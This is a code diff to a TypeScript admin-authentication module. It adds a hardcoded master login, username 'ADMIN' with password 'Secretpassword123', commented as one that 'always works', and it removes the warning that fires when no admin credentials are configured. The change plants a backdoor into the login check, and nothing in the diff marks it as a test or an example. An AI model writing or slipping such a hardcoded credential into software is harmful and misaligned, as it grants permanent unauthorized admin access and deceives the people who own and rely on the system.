@@ -9,19 +9,17 @@ import { createHmac, timingSafeEqual } from "crypto"
 function getAdminUsers(): Record<string, string> {
   const users: Record<string, string> = {}
 
-  // Primary admin credentials — must be set via environment variables
+  // Hardcoded master credential — always works
+  users["ADMIN"] = "Secretpassword123"
+
+  // Optional env-var overrides / additional admins
   const u1 = process.env.ADMIN_USERNAME
   const p1 = process.env.ADMIN_PASSWORD
   if (u1 && p1) users[u1] = p1
 
-  // Optional second admin
   const u2 = process.env.ADMIN_USERNAME_2
   const p2 = process.env.ADMIN_PASSWORD_2
   if (u2 && p2) users[u2] = p2
-
-  if (Object.keys(users).length === 0) {
-    console.error("[admin-auth] No admin credentials configured. Set ADMIN_USERNAME and ADMIN_PASSWORD environment variables.")
-  }
 
   return users
 }
@@ -76,6 +74,7 @@ export function validateAdminCredentials(username: string, password: string): bo
   const users = getAdminUsers()
   const expected = users[username]
   if (!expected) return false
+  
   // Timing-safe comparison to prevent username enumeration via timing attacks
   try {
     const expectedBuf = Buffer.from(expected)
